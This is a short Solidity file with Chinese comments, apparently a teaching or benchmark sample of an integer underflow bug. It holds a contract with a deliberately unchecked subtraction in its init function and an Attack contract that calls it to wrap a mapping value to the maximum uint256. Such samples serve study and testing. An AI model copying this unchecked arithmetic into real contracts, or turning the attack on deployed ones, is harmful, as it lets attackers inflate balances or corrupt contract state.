// 此程式碼存在 Integer Underflow 漏洞
// 漏洞重點：狀態變數 map 的初始值為 0，但在函式 init 裡直接進行 map[k] -= v 操作，當 v > map[k] 時會產生 underflow (在 Solidity 版本 < 0.8 中會回繞至最大值)

contract IntegerOverflowMappingSym1 {
    // 狀態變數，尚未初始化時預設為 0，漏洞在於這裡未檢查減法是否會導致 underflow
    mapping(uint256 => uint256) public map;

    // 漏洞函式：直接使用減法運算，當 map[k] 為 0 時，減去正數 v 將會 underflow
    function init(uint256 k, uint256 v) public {
        // 潛在漏洞：無檢查機制，若 v 大於 map[k]（預設為 0）會導致 underflow
        map[k] -= v;
    }
}

// 攻擊合約範例：
// 攻擊者透過此合約部署，並以特定的 k 值（例如 0 或其他尚未初始化的 key）與非零 v 呼叫 init()
// 因為 map[k] 預設為 0，當傳入 v > 0 時，會發生 underflow，使 map[k] 變成一個極大的數字
contract Attack {
    IntegerOverflowMappingSym1 public target;

    // 部署時指定漏洞合約位址
    constructor(address _target) public {
        target = IntegerOverflowMappingSym1(_target);
    }

    // 攻擊流程：可傳入 key 與一個非零數字 v，以觸發 underflow
    function attack(uint256 k, uint256 v) public {
        // 例如：k 為 0，v 為 1 即可使得 map[0] = 0 - 1 = max uint256 value (underflow)
        target.init(k, v);
    }
}
